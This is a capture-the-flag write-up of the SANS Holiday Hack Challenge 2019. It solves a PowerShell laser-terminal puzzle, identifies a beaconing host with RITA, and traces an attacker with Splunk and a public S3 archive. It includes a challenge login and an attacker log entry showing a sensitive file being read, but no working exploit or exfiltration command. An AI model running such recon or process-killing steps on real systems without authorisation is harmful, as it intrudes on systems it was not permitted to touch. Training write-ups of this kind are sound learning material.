<span class="go">Change the lense refraction value (1.0 - 2.0):</span>
<span class="go">GET http://localhost:1225/api/refraction?val=1.0</span>

<span class="go">Change laser temperature in degrees Celsius:</span>
<span class="go">GET http://localhost:1225/api/temperature?val=-10</span>

<span class="go">Change the mirror angle value (0 - 359):</span>
<span class="go">GET http://localhost:1225/api/angle?val=45.1</span>

<span class="go">Change gaseous elements mixture:</span>
<span class="go">POST http://localhost:1225/api/gas</span>
<span class="go">POST BODY EXAMPLE (gas mixture percentages):</span>
<span class="go">O=5&amp;H=5&amp;He=5&amp;N=5&amp;Ne=20&amp;Ar=10&amp;Xe=10&amp;F=20&amp;Kr=10&amp;Rn=10</span>
<span class="go">----------------------------------------------------</span>
<span class="go">&lt;/pre&gt;</span>
<span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
<p>Alright, there is an API available on the research lab computer, where we can
change the value of the different parameters of the laser. So, once we find the
correct values for the laser's parameters, we'll input them here.</p>
<p>Now, let's take a look at this calling card file:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-Content /home/callingcard.txt</span>
<span class="go">What&#39;s become of your dear laser?</span>
<span class="go">Fa la la la la, la la la la</span>
<span class="go">Seems you can&#39;t now seem to raise her!</span>
<span class="go">Fa la la la la, la la la la</span>
<span class="hll"><span class="go">Could commands hold riddles in hist&#39;ry?</span>
</span><span class="go">Fa la la la la, la la la la</span>
<span class="go">Nay! You&#39;ll ever suffer myst&#39;ry!</span>
<span class="go">Fa la la la la, la la la la</span>
</pre></div>
<p>The calling card seems to imply that we can find some riddles in the command
history. So let's dig into it:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; get-history</span>

<span class="go">  Id CommandLine</span>
<span class="go">  -- -----------</span>
<span class="go">   1 Get-Help -Name Get-Process</span>
<span class="go">   2 Get-Help -Name Get-*</span>
<span class="go">   3 Set-ExecutionPolicy Unrestricted</span>
<span class="go">   4 Get-Service | ConvertTo-HTML -Property Name, Status &gt; C:\services.htm</span>
<span class="go">   5 Get-Service | Export-CSV c:\service.csv</span>
<span class="go">   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv</span>
<span class="hll"><span class="go">   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent</span>
</span><span class="go">   8 Get-EventLog -Log &quot;Application&quot;</span>
<span class="hll"><span class="go">   9 I have many name=value variables that I share to applications system wide. At a com…</span>
</span></pre></div>
<p>We've found the correct value for the angle, which seems to be <code>65.5</code>.
The ninth entry also seems interesting, let's take a look at it:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; get-history -id 9  | format-list</span>

<span class="go">Id                 : 9</span>
<span class="go">CommandLine        : I have many name=value variables that I share to applications</span>
<span class="go">                     system wide. At a command I will reveal my secrets once you Get my</span>
<span class="go">                     Child Items.</span>
<span class="go">ExecutionStatus    : Completed</span>
<span class="go">StartExecutionTime : 11/29/19 4:57:16 PM</span>
<span class="go">EndExecutionTime   : 11/29/19 4:57:16 PM</span>
<span class="go">Duration           : 00:00:00.6090308</span>
</pre></div>
<p>Sharing <code>name=value</code> variables system wide... This seems to point to
<a class="reference external" href="https://en.wikipedia.org/wiki/Environment_variable">environment variables</a>.
Let's explore the environment variables, using the <code>env:</code> object:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-ChildItem env:</span>

<span class="go">Name                           Value</span>
<span class="go">----                           -----</span>
<span class="go">_                              /bin/su</span>
<span class="go">DOTNET_SYSTEM_GLOBALIZATION_I… false</span>
<span class="go">HOME                           /home/elf</span>
<span class="go">HOSTNAME                       ed982fcad65c</span>
<span class="go">LANG                           en_US.UTF-8</span>
<span class="go">LC_ALL                         en_US.UTF-8</span>
<span class="go">LOGNAME                        elf</span>
<span class="go">MAIL                           /var/mail/elf</span>
<span class="go">PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bi…</span>
<span class="go">PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mod…</span>
<span class="go">PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/shar…</span>
<span class="go">PWD                            /home/elf</span>
<span class="go">RESOURCE_ID                    f8a577fa-4565-46c9-a2b6-5ab85e9da0e1</span>
<span class="hll"><span class="go">riddle                         Squeezed and compressed I am hidden away. Expand me from …</span>
</span><span class="go">SHELL                          /home/elf/elf</span>
<span class="go">SHLVL                          1</span>
<span class="go">TERM                           xterm</span>
<span class="go">USER                           elf</span>
<span class="go">USERDOMAIN                     laserterminal</span>
<span class="go">userdomain                     laserterminal</span>
<span class="go">username                       elf</span>
<span class="go">USERNAME                       elf</span>
</pre></div>
<p>The <code>riddle</code> variable seems interesting. Let's expand it:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-ChildItem env:riddle | Format-List</span>

<span class="go">Name  : riddle</span>
<span class="go">Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will</span>
<span class="go">        show you the way. Recurse through all /etc and Sort on my LastWriteTime to</span>
<span class="go">        reveal im the newest of all.</span>
</pre></div>
<p>Alright, let's list every file in <code>/etc</code> and sort by their
<code>LastWriteTime</code> attribute:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-ChildItem -recurse /etc | sort LastWriteTime</span>
<span class="go">[...]</span>
<span class="go">    Directory: /etc/apt</span>

<span class="go">Mode                LastWriteTime         Length Name</span>
<span class="go">----                -------------         ------ ----</span>
<span class="hll"><span class="go">--r---          12/23/19  8:35 PM        5662902 archive</span>
</span></pre></div>
<p>The newest file seems to be an archive. Let's extract it:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Expand-Archive -Path /etc/apt/archive -DestinationPath extracted_archive</span>
<span class="go">PS /home/elf&gt; dir</span>
<span class="go">Directory: /home/elf</span>

<span class="go">Mode                LastWriteTime         Length Name</span>
<span class="go">----                -------------         ------ ----</span>
<span class="go">d-r---          12/13/19  5:15 PM                depths</span>
<span class="go">d-----          12/23/19  8:37 PM                extracted_archive</span>
<span class="go">--r---          12/13/19  4:29 PM           2029 motd</span>
<span class="go">PS /home/elf&gt; cd ./extracted_archive/refraction</span>
<span class="go">PS /home/elf/extracted_archive/refraction&gt; dir</span>


<span class="go">    Directory: /home/elf/extracted_archive/refraction</span>

<span class="go">Mode                LastWriteTime         Length Name</span>
<span class="go">----                -------------         ------ ----</span>
<span class="hll"><span class="go">------           11/7/19 11:57 AM            134 riddle</span>
</span><span class="hll"><span class="go">------           11/5/19  2:26 PM        5724384 runme.elf</span>
</span></pre></div>
<p>The archive contains an ELF binary, and a riddle. First, let's run the ELF
binary. I didn't manage to run it from the box, so I extracted it, by base64
encoding it, and then decoding it on a Linux box. I was then able to run it:</p>
<div class="highlight"><pre><span></span><span class="gp">user@debian:~$</span> ./powershell_elf.bin
<span class="hll"><span class="go">refraction?val=1.867</span>
</span></pre></div>
<p>This gives us the correct value for the refraction variable. Now, let's look
at the <code>riddle</code> file:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf/extracted_archive/refraction&gt; Get-Content ./riddle</span>
<span class="go">Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:</span>

<span class="go">25520151A320B5B0D21561F92C8F6224</span>
</pre></div>
<p>So, we must look for a file in the <code>/home/elf/depths</code> folder, with an
MD5 sum equal to <code>25520151A320B5B0D21561F92C8F6224</code>. Let's take a look:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-ChildItem -file -recurse ./depths/ | get-filehash -algorithm MD5 | where-object { $_.HASH -eq &quot;25520151A320B5B0D21561F92C8F6224&quot; } | Format-List</span>

<span class="go">Algorithm : MD5</span>
<span class="go">Hash      : 25520151A320B5B0D21561F92C8F6224</span>
<span class="hll"><span class="go">Path      : /home/elf/depths/produce/thhy5hll.txt</span>
</span></pre></div>
<p>The file with an MD5 sum of <code>25520151A320B5B0D21561F92C8F6224</code> seems to
be <code>/home/elf/depths/produce/thhy5hll.txt</code>. Let's look inside:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-Content /home/elf/depths/produce/thhy5hll.txt</span>
<span class="hll"><span class="go">temperature?val=-33.5</span>
</span>
<span class="go">I am one of many thousand similar txt&#39;s contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName&#39;s to Sort Length.</span>
</pre></div>
<p>We now have the correct value for the temperature, <code>-33.5</code>.</p>
<p>Apparently, the new file to find is the one with the longest full name in
<code>/home/elf/depths</code>. Let's list the file and sort them by their
<code>FullName</code> attribute:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf/&gt; Get-ChildItem -file -recurse /home/elf/depths | sort {  $_.FullName.length } | select-object -property FullName | fl</span>
<span class="go">[...]</span>
<span class="go">FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/</span>
<span class="go">           escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/p</span>
<span class="go">           ractical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/da</span>
<span class="go">           wn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soo</span>
<span class="go">           n/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt</span>
<span class="go">PS /home/elf/extracted_archive/refraction&gt; gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt</span>
<span class="go">Get process information to include Username identification. Stop Process to show me you&#39;re skilled and in this order they must be killed:</span>

<span class="go">bushy</span>
<span class="go">alabaster</span>
<span class="go">minty</span>
<span class="go">holly</span>

<span class="go">Do this for me and then you /shall/see .</span>
</pre></div>
<p>Once we find the file with the longest name, we're tasked with a new challenge.
We must kill the processes of the given users, in this particular order. Let's
list the processes and kill them:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-Process -IncludeUserName</span>

<span class="go">     WS(M)   CPU(s)      Id UserName                       ProcessName</span>
<span class="go">     -----   ------      -- --------                       -----------</span>
<span class="go">     26.84     1.86       7 root                           CheerLaserServi</span>
<span class="go">    184.41    61.33      32 elf                            elf</span>
<span class="go">      3.56     0.04       1 root                           init</span>
<span class="go">      0.82     0.00      24 bushy                          sleep</span>
<span class="go">      0.82     0.00      26 alabaster                      sleep</span>
<span class="go">      0.75     0.00      29 minty                          sleep</span>
<span class="go">      0.82     0.00      30 holly                          sleep</span>
<span class="go">      3.32     0.00      31 root                           su</span>

<span class="go">PS /home/elf/extracted_archive/refraction&gt; Stop-Process -Id 24</span>
<span class="go">PS /home/elf/extracted_archive/refraction&gt; Stop-Process -Id 26</span>
<span class="go">PS /home/elf/extracted_archive/refraction&gt; Stop-Process -Id 29</span>
<span class="go">PS /home/elf/extracted_archive/refraction&gt; Stop-Process -Id 30</span>
</pre></div>
<p>After killing the processes, the riddle said that we <code>/shall/see</code>. Let's
look into the <code>/shall</code> folder at the root of the file system:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf/extracted_archive/refraction&gt; dir /shall</span>


<span class="go">    Directory: /shall</span>

<span class="go">Mode                LastWriteTime         Length Name</span>
<span class="go">----                -------------         ------ ----</span>
<span class="hll"><span class="go">--r---          12/23/19  8:55 PM            149 see</span>
</span></pre></div>
<p>There is indeed a <code>/shall/see</code> file. Let's get its content:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; Get-Content /shall/see</span>
<span class="go">Get the .xml children of /etc - an event log to be found. Group all .Id&#39;s and the last thing will be in the Properties of the lonely unique event Id.</span>
</pre></div>
<p>So, there is an event log in XML format in <code>/etc</code>. We must find the event
with the unique <code>Id</code>, and the last parameters for the alser will be in
its properties. First, let's find this XML file:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf/extracted_archive/refraction&gt; Get-ChildItem -recurse -file -include &quot;*.xml&quot; /etc</span>
<span class="go">Get-ChildItem : Access to the path &#39;/etc/ssl/private&#39; is denied.</span>
<span class="go">At line:1 char:1</span>
<span class="go">+ Get-ChildItem -recurse -file -include &quot;*.xml&quot; /etc</span>
<span class="go">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
<span class="go">+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [Get-ChildItem], UnauthorizedAccessException</span>
<span class="go">+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span>



<span class="hll"><span class="go">    Directory: /etc/systemd/system/timers.target.wants</span>
</span>
<span class="go">Mode                LastWriteTime         Length Name</span>
<span class="go">----                -------------         ------ ----</span>
<span class="hll"><span class="go">--r---          11/18/19  7:53 PM       10006962 EventLog.xml</span>
</span></pre></div>
<p>So, the event log sits at <code>/etc/systemd/system/timers.target.wants/EventLog.xml</code>.
We can directly parse the content of the file in PowerShell:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; [xml]$event_log = gc /etc/systemd/system/timers.target.wants/EventLog.xml</span>
</pre></div>
<p>Then, let's take a look at every <code>Id</code> to see which one is unique:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; $event_log.Objs.Obj.Props.I32 | ? { $_.N -eq &quot;Id&quot; } | % {$_.&#39;#text&#39;} | Group-Object | Format-Table count, name</span>

<span class="go">Count Name</span>
<span class="go">----- ----</span>
<span class="hll"><span class="go">    1 1</span>
</span><span class="go">   39 2</span>
<span class="go">  179 3</span>
<span class="go">    2 4</span>
<span class="go">  905 5</span>
<span class="go">   98 6</span>
</pre></div>
<p>So, the unique <code>Id</code> seems to be <code>1</code>. Let's list the properties of
the event with <code>Id=1</code>:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; $event_log.Objs.Obj | ? { $_.Props.I32.N -eq &#39;Id&#39; -and $_.Props.I32.&#39;#text&#39; -eq 1} | % { $_.Props.Obj.LST.Obj.Props.S.&#39;#text&#39; }</span>
<span class="go">2019-11-07 17:59:56.525</span>
<span class="go">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span>
<span class="go">10.0.14393.206 (rs1_release.160915-0644)</span>
<span class="go">Windows PowerShell</span>
<span class="go">Microsoft® Windows® Operating System</span>
<span class="go">Microsoft Corporation</span>
<span class="go">PowerShell.EXE</span>
<span class="hll"><span class="go">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &quot;`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n&quot;</span>
</span><span class="go">C:\</span>
<span class="go">ELFURESEARCH\allservices</span>
<span class="go">High</span>
<span class="go">MD5=097CE5761C89434367598B34FE32893B</span>
<span class="go">C:\Windows\System32\svchost.exe</span>
<span class="go">C:\Windows\system32\svchost.exe -k netsvcs</span>
</pre></div>
<p>This gives us the values for the gas dosage for the laser. We now have every
parameters to repair the laser.</p>
<p>First let's update the angle:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Tue, 24 Dec 2019 11:42:25 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 77</span>

<span class="go">Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.</span>
</pre></div>
<p>Now the refraction:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Tue, 24 Dec 2019 11:42:30 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 87</span>

<span class="go">Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.</span>
</pre></div>
<p>Then the temperature:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Tue, 24 Dec 2019 11:42:34 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 82</span>

<span class="go">Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.</span>
</pre></div>
<p>And finally the gas levels:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; $correct_gases_postbody = @{ O=6; H=7; He=3; N=4; Ne=22; Ar=11; Xe=10; F=20; Kr=8; Rn=9}</span>
<span class="go">PS /home/elf&gt; (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/gas -Method POST -Body $correct_gases_postbody).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Tue, 24 Dec 2019 11:42:45 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 81</span>

<span class="go">Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.</span>
</pre></div>
<p>Aaaaand:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Mon, 30 Dec 2019 12:39:57 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 58</span>

<span class="go">Failure - Only 2.17 Mega-Jollies of Laser Output Reached!</span>
</pre></div>
<p>It didn't work! Hmm, maybe we should try <a class="reference external" href="https://www.youtube.com/watch?v=p85xwZ_OLX0">turning it off and on again?</a></p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/off).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Mon, 30 Dec 2019 12:40:12 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 33</span>

<span class="go">Christmas Cheer Laser Powered Off</span>
<span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/on).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Mon, 30 Dec 2019 12:40:18 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 32</span>

<span class="go">Christmas Cheer Laser Powered On</span>
<span class="go">PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Mon, 30 Dec 2019 12:40:21 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 200</span>

<span class="go">Success! - 5.47 Mega-Jollies of Laser Output Reached!</span>
</pre></div>
<p>There you go!</p>
</div>
<div class="section" id="network-log-analysis-determine-compromised-system">
<h3><a class="toc-backref" href="#id13">Network Log Analysis: Determine Compromised System</a></h3>
<p>We're given <a class="reference external" href="https://downloads.elfu.org/elfu-zeeklogs.zip">Zeek logs</a> to try
and identify the IP address of the infected computer. Among the log files,
we can see some HTML files. Let's open them in our browser:</p>
<img alt="rita_index.png" class="align-center" src="/images/sans-christmas-challenge-2019/rita_index.png" />
<p>We have the web interface to <a class="reference external" href="https://github.com/activecm/rita">RITA</a>, the
Real Intelligence Threat Analytics tool. It can ingest Bro or Zeek logs, and
detect several suspicious behaviour on the network, including <strong>beaconing
behaviour</strong>. This means that it can likely help us identify the machine that
was infected, and is likely taking order from a <a class="reference external" href="https://en.wikipedia.org/wiki/Botnet#Command_and_control">C2 server</a>.</p>
<p>Let's go over the &quot;Beacons&quot; tab:</p>
<img alt="rita_beacons.png" class="align-center" src="/images/sans-christmas-challenge-2019/rita_beacons.png" />
<p>By far, the most suspicious activity seems to be between internal IP
<code>192.168.134.130</code> and external IP <code>144.202.46.214</code>. This means that
the infected machine is likely <code>192.168.134.130</code>.</p>
</div>
</div>
<div class="section" id="objective-6-splunk">
<h2><a class="toc-backref" href="#id14">Objective 6: Splunk</a></h2>
<p>Now that we have solved objectives 2 through 5, let's go talk to Santa again.</p>
<img alt="santa_squad.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa_squad.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>Thank you for finding <a class="reference external" href="https://disney.fandom.com/wiki/Jane_Banks">Jane</a>
and <a class="reference external" href="https://disney.fandom.com/wiki/Michael_Banks">Michael</a>, our two
turtle doves!</p>
<p>I’ve got an uneasy feeling about how they disappeared.</p>
<p>Turtle doves wouldn’t wander off like that.</p>
<p>Someone must have stolen them! Please help us find the thief!</p>
<p>It’s a moral imperative!</p>
<p>I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!</p>
<p>Gosh, I can’t help but think:</p>
<p>Winds in the East, snow coming in…</p>
<p>Like something is brewing and about to begin!</p>
<p>Can’t put my finger on what lies in store,</p>
<p><a class="reference external" href="https://www.youtube.com/watch?v=SSfGBskfthg">But I fear what’s to happen all happened before!</a></p>
</blockquote>
<p>We're asked to contact the Elf U SOC team via their <a class="reference external" href="https://splunk.elfu.org/">Splunk server</a>
(credentials <code>elf:elfsocks</code>).</p>
<p>We first have a little chat with Kent:</p>
<blockquote>
<p><strong>Guest (me):</strong> Hi Kent :-)</p>
<p><strong>Kent:</strong> Hi yourself.</p>
<p><strong>Guest (me):</strong> I ran into Professor Banas. He said you contacted him about
his computer being hacked?</p>
<p><strong>Kent:</strong> Oh, well lots of analysts try to make it here in the ELF U SOC,
but most of them crack under the pressure</p>
<p><strong>Guest (me):</strong> Well, can I help?</p>
<p><strong>Kent:</strong> You can try. Go check out #ELFU SOC. Maybe someone there will
have time to bring you up to speed. Here's a tip, click on those blinking
red dots to the left column and read very carefully.</p>
<p><strong>Guest (me):</strong> Thanks???</p>
</blockquote>
<p>Alright, Kent... Way to be an ass. Anyway, let's check the #ELFU SOC channel:</p>
<blockquote>
<p><strong>Cosmo Jingleberg:</strong> Hey did you all see that beaconing detection from
RITA?</p>
<p><strong>Zippy Frostington:</strong> Yep. And we have some system called 'sweetums' here
on campus communicating with the same weird IP</p>
<p><strong>Alice Bluebird:</strong> Gah... that's Professor Banas' system from over in the
Polar Studies department</p>
<p><strong>Guest (me):</strong> That's why I'm here, actually...Kent sent me to this
channel to help with Prof. Banas' system</p>
<p><strong>Alice Bluebird:</strong> smh...I'll DM you</p>
</blockquote>
<p>And in DM with Alice:</p>
<blockquote>
<p><strong>Alice Bluebird:</strong> Okay. Your goal is to find the message for Kent that
the adversary embedded in this attack.</p>
<p>If you think you have the chops for that, don't let me slow you down. Get
searching and enter the Challenge Question answer when you've found it.</p>
<p>You'll need to know some things, though:</p>
<blockquote>
<ul class="simple">
<li>We use Splunk, so click <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search">here</a>
or hit the Search link in the navigation up above to get started.</li>
<li>I copied some raw files <a class="reference external" href="http://elfu-soc.s3-website-us-east-1.amazonaws.com/">here</a>
or click the File Archive link in the navigation. (You'll find some
references to the File Archive contents in Splunk)</li>
</ul>
</blockquote>
<p><strong>You'll need to use both of these resources to answer the Challenge
Question!</strong></p>
<p>Don't worry though, I can get you started down the right path with a few
hints if you need 'em. All you have to do is answer the first training
question. If you've read all the chat windows here, you already have the
answer ;-)</p>
</blockquote>
<div class="section" id="answering-the-challenge-question">
<h3><a class="toc-backref" href="#id15">Answering the challenge question</a></h3>
<p>Alright, we're supposed to find the message the attacker left for Kent. Alice
says that we need both the Splunk search tool and the raw file archive to
answer this question. However, just using the file archive is possible.</p>
<p>By taking a look at the <a class="reference external" href="http://elfu-soc.s3-website-us-east-1.amazonaws.com/">file archive</a>
URL, we can see that it's hosted on an AWS S3 bucket. Browsing the web
interface is not super practical, so let's download the bucket using the <a class="reference external" href="https://aws.amazon.com/cli/">AWS
CLI</a> tools:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> aws s3 sync s3://elfu-soc . --no-sign-request --region us-east-1
</pre></div>
<p>The <code>--no-sign-request</code> flag is used to tell the tool that we don't
want to try to authenticate: we want to download the S3 content as an
anonymous user.</p>
<p>We can now search the raw files for mentions of Kent:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">cd</span> <span class="s2">&quot;stoQ  Artifacts&quot;</span>
<span class="gp">$</span> grep -Rn <span class="s1">&#39;Kent&#39;</span> .
<span class="go">./home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4:2:&lt;cp:coreProperties xmlns:cp=&quot;http://schemas.openxmlformats.org/package/2006/metadata/core-properties&quot; xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot; xmlns:dcterms=&quot;http://purl.org/dc/terms/&quot; xmlns:dcmitype=&quot;http://purl.org/dc/dcmitype/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;&lt;dc:title&gt;Holiday Cheer Assignment&lt;/dc:title&gt;&lt;dc:subject&gt;19th Century Cheer&lt;/dc:subject&gt;&lt;dc:creator&gt;Bradly Buttercups&lt;/dc:creator&gt;&lt;cp:keywords&gt;&lt;/cp:keywords&gt;&lt;dc:description&gt;Kent you are so unfair. And we were going to make you the king of the Winter Carnival.&lt;/dc:description&gt;&lt;cp:lastModifiedBy&gt;Tim Edwards&lt;/cp:lastModifiedBy&gt;&lt;cp:revision&gt;4&lt;/cp:revision&gt;&lt;dcterms:created xsi:type=&quot;dcterms:W3CDTF&quot;&gt;2019-11-19T14:54:00Z&lt;/dcterms:created&gt;&lt;dcterms:modified xsi:type=&quot;dcterms:W3CDTF&quot;&gt;2019-11-19T17:50:00Z&lt;/dcterms:modified&gt;&lt;cp:category&gt;&lt;/cp:category&gt;&lt;/cp:coreProperties&gt;</span>
</pre></div>
<p>The message is <code>Kent you are so unfair. And we were going to make you the
king of the Winter Carnival.</code>. We got the correct answer, and we didn't need to
use Splunk!</p>
</div>
<div class="section" id="answering-the-training-questions">
<h3><a class="toc-backref" href="#id16">Answering the training questions</a></h3>
<p>However, the SANS Challenges are about learning new skills. Being on the red
side of infosec, I don't often see how the blue team operates. So I thought it
would be fun to try and learn how to search for an attacker using Splunk.</p>
<p>So let's answer the training questions!</p>
<div class="section" id="first-question">
<h4><a class="toc-backref" href="#id17">First question</a></h4>
<ol class="arabic simple">
<li>What is the short host name of Professor Banas' computer?</li>
</ol>
<p>This one is easy, we can find the info in the #ELFU SOC chan: <code>sweetums</code>.</p>
</div>
<div class="section" id="second-question">
<h4><a class="toc-backref" href="#id18">Second question</a></h4>
<ol class="arabic simple" start="2">
<li>What is the name of the sensitive file that was likely accessed and copied
by the attacker? Please provide the fully qualified location of the file.
(Example: C:tempreport.pdf)</li>
</ol>
<p>By DM, Alice tells us that the Elf U staff is worried that the attacker may
have accessed Santa's sensitive data. So let's search for <code>santa</code> in
the <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20index%3Dmain%20santa&amp;display.page.search.mode=smart&amp;dispatch.sample_ratio=1&amp;earliest=0&amp;latest=now&amp;display.general.type=events&amp;display.page.search.tab=events&amp;sid=1577722638.3279">Splunk search engine</a>.</p>
<p>The very first result is a suspiciously long PowerShell command accesses a file
likely sent by Santa to Professor Banas:</p>
<div class="highlight"><pre><span></span>08/25/2019 09:19:20 AM
LogName=Microsoft-Windows-PowerShell/Operational
SourceName=Microsoft-Windows-PowerShell
EventCode=4103
EventType=4
Type=Information
ComputerName=sweetums.elfu.org
User=NOT_TRANSLATED
Sid=S-1-5-21-1217370868-2414566453-2573080502-1004
SidType=0
TaskCategory=Executing Pipeline
OpCode=To be used when operation is just executing a method
RecordNumber=417616
Keywords=None
Message=CommandInvocation(Stop-AgentJob): &quot;Stop-AgentJob&quot;
CommandInvocation(Format-List): &quot;Format-List&quot;
CommandInvocation(Out-String): &quot;Out-String&quot;
ParameterBinding(Stop-AgentJob): name=&quot;JobName&quot;; value=&quot;4VCUDA&quot;
<span class="hll">ParameterBinding(Format-List): name=&quot;InputObject&quot;; value=&quot;C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt:1:Carl, you know there&#39;s no one I trust more than you to help.  Can you have a look at this draft Naughty and Nice list for 2019 and let me know your thoughts? -Santa&quot;
</span>ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Commands.Internal.Format.FormatStartData&quot;
ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Commands.Internal.Format.GroupStartData&quot;
